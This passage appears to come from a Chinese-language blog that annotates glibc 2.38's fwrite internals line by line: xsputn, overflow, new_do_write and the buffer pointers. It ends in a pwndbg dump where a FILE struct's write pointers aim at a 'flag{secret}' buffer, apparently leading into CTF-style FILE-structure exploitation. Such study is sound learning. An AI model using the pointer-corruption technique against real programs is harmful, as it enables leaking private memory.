glibc-2.38/libio/fileops.c:431</span><br><span class="line">	read缓冲区三个指针全等于_IO_buf_base</span><br><span class="line">	write缓冲区base和ptr指向_IO_buf_base, end指针指向</span><br><span class="line">]</span><br><span class="line">write[&quot;__write(f-&gt;_fileno,data,to_do)&quot;]</span><br><span class="line"></span><br><span class="line">_IO_file_write[_IO_new_file_write @ glibc-2.38/libio/fileops.c:1173]</span><br><span class="line"></span><br><span class="line">fwrite--&quot;_IO_sputn&quot;--&gt;_IO_fwrite</span><br><span class="line">_IO_fwrite--&gt;_IO_file_xsputn</span><br><span class="line">_IO_file_xsputn--&quot;_IO_OVERFLOW&quot;--&gt;_IO_file_overflow</span><br><span class="line">_IO_file_xsputn--&gt;_IO_do_write</span><br><span class="line">_IO_do_write--&gt;new_do_write</span><br><span class="line">new_do_write--&quot;_IO_SYSWRITE&quot;--&gt;_IO_file_write</span><br><span class="line">_IO_file_write--&gt;write</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)<span class="comment">//一个单位size字节,但是实际上还是以字节为单位</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);		<span class="comment">//check个寂寞</span></span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);		<span class="comment">//实际上调用_IO_new_file_xsputn</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)		<span class="comment">//返回实际写入单位数,注意不是字节数</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;		<span class="comment">//数据指针</span></span><br><span class="line">  <span class="type">size_t</span> to_do = n;		<span class="comment">//当前还差多少个没有写入</span></span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;	<span class="comment">//行缓冲强制刷新缓冲区标志</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;		<span class="comment">//当前缓冲区剩余空间</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  	<span class="comment">//如果要写入的大小大于一个块或者filebuf没有缓冲区,那么直接使用系统调用</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//如果使用行缓冲 并且 该f文件流目前正在进行写入操作</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//count表示当前写缓冲区剩余空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)			<span class="comment">//如果剩余空间足够大则直接写入</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )<span class="comment">//寻找最后一个\n,注意此时并未向缓冲区进行拷贝,只是寻找\n</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)		<span class="comment">//如果发现有换行符则must_flush置1表示必须刷新缓冲区</span></span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则如果写缓冲区中还有空间,首先计算一下剩余空间count</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)			<span class="comment">//如果剩余写缓冲区够大直接放到写缓冲区</span></span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);	<span class="comment">//直接从data搬到write_buf中</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_do降为0表明已经写入writebuf了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//到此已经解决了写入比较少的情况,能够直接放到write_buf中</span></span><br><span class="line">    <span class="comment">//下面还要考虑的业务有:</span></span><br><span class="line">    <span class="comment">//1.行缓冲是否有\n结尾,也就是说must_flush是否置位, 如果是,则需要刷新缓冲区(也就是写入到文件)</span></span><br><span class="line">    <span class="comment">//2.写入量很大,超过了缓冲区剩余数量</span></span><br><span class="line">    	<span class="comment">//2.1首先把现有的缓冲区写入到文件,缓冲区复位,看看能否容纳写入量</span></span><br><span class="line">    	<span class="comment">//2.2如果还容纳不了,则直接syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果没开启行缓冲,(也就是must_flush=0),并且写入量比较小已经放到了缓冲区,那么可以返回了,不走下面的业务,直接return</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对于行缓冲需要刷新缓冲区,或者写入量太大时首先尝试缓冲区复位, 处理方式是一样的,首先都刷新缓冲区</span></span><br><span class="line">    <span class="comment">//接下来判断一下to_do看看还有没有需要写入的,对于已完成的行缓冲情况可以返回了</span></span><br><span class="line">    <span class="comment">//对于写入量大的情况,如果刷新了缓冲区之后,to_do还是大于缓冲区大小,则直接syscall</span></span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)		<span class="comment">//如果还有to_do则表明count&lt;to_do</span></span><br><span class="line">      								<span class="comment">//如果有must_flush说明行缓冲需要刷新缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)			<span class="comment">//刷新缓冲区,将缓冲区写入文件,调整文件指针,如果已经到达文件末尾则返回EOF</span></span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">//如果文件写满了,也就是EOF了,如果此时to_do为0,对应已经满足的行缓冲,返回EOF. </span></span><br><span class="line">      <span class="comment">//对于未满足的大量写入,返回已经写入的字节数n-to_do</span></span><br><span class="line">	  </span><br><span class="line">      </span><br><span class="line">	</span><br><span class="line">      <span class="comment">//如果控制流到这儿了,说明起码没有EOF</span></span><br><span class="line">      <span class="comment">//要么是已经刷新了缓冲区的行缓冲情况,要么是未满足的大量写入请求</span></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;		<span class="comment">//block_size大小是缓冲区大小</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//如果block_size&gt;=128,则do_write = to_do - (to_do % block_size)</span></span><br><span class="line">      <span class="comment">//to_do大小可能是若干个整块最后是一个不满的块,这个不满的块大小就是(to_do % block_size)</span></span><br><span class="line">      <span class="comment">//这样算完之后,do_write就是若干整块 , 不包括最后的不满块</span></span><br><span class="line">    	</span><br><span class="line">	  <span class="comment">//否则block_size太小不足128,此时do_write就是to_do</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)					<span class="comment">//如果有do_write,下面就要实际写入了</span></span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);	</span><br><span class="line">	  to_do -= count;			<span class="comment">//此时的to_do可能是不满块剩下的,或者new_do_write没有写完剩下的</span></span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)		<span class="comment">//如果实际上写入的不足do_write,说明new_do_write没有完成任务,要么是EOF,尽力了,返回实际读了多少</span></span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)				<span class="comment">//如果到这里还有to_do,说明是最后那个不满块,</span></span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);	</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_IO_OVERFLOW</code>这个宏实际上也是调用vtable[overflow]函数实现的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)				<span class="comment">//if (_IO_OVERFLOW (f, EOF) == EOF)</span></span><br><span class="line">&#123;<span class="comment">//ch是结束字符,如果是EOF则不附加在末尾,否则比如&#x27;\n&#x27;会附加在末尾</span></span><br><span class="line">    <span class="comment">//如果打开标志是&quot;r&quot;,也就是只读,那么会在_IO_new_file_fopen中设置_IO_NO_WRITES标志,表明只读打开</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span><span class="comment">//overflow的作用是将缓冲区写入文件,显然对于只读文件不能写</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="comment">//如果文件流f当前不不不处于往文件写入的状态, 或者文件流f没有write_buf</span></span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)	<span class="comment">//对于没有write_buf的情况则给f分配一个</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);			<span class="comment">//申请一个0x1000字节的write_buf给f</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);	<span class="comment">//设置write_buf和buf相同</span></span><br><span class="line">	&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))	</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      	<span class="comment">//初始化指针</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">			f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//这里实际上是f-&gt;_IO_write_ptr = f-&gt;_IO_buf_base 但是实际上f-&gt;_IO_read_ptr也是这个值,因此无所谓了</span></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">		<span class="comment">//标记正在往文件写入</span></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)			<span class="comment">//如果ch为EOF则将目前的缓冲区先写入文件然后就返回了</span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//_IO_do_write会复位缓冲区</span></span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">//如果writebuf满了</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)	<span class="comment">//也是先把目前缓冲区写入文件,实际上调用的是_IO_do_write,也会复位缓冲区 </span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;			<span class="comment">//最后补上一个ch字符</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)	<span class="comment">//如果不缓冲或者行缓冲并且有\n</span></span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<span class="comment">//如果最后剩下的块比当时的缓冲区大,还是会造成文件io的</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span>			<span class="comment">//count = new_do_write (f, s, do_write);</span></span><br><span class="line">&#123;	</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);	<span class="comment">//调整文件指针</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);		<span class="comment">//实际写,count是实际写入的字节数</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//read_buf缓冲区参照buf复位</span></span><br><span class="line">    </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;	<span class="comment">//write_buf复位</span></span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;<span class="comment">//如果缓冲区有空</span></span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)<span class="comment">//如果缓冲区空地够大</span></span><br><span class="line">	    count = more;</span><br><span class="line">          <span class="comment">//到这里时,count&lt;=more</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)<span class="comment">//要么mempcpy实现拷贝,要么循环实现</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">          <span class="comment">//如果more=0则不会执行后句,此时最后的剩余块也放到了缓冲区,不需要腾空了</span></span><br><span class="line">          <span class="comment">//否则more&gt;0表明还有剩下的,但是缓冲区此时满了,需要缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">          <span class="comment">//然后重新把剩下的放到缓冲区中</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *f</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _flags = <span class="number">2048</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  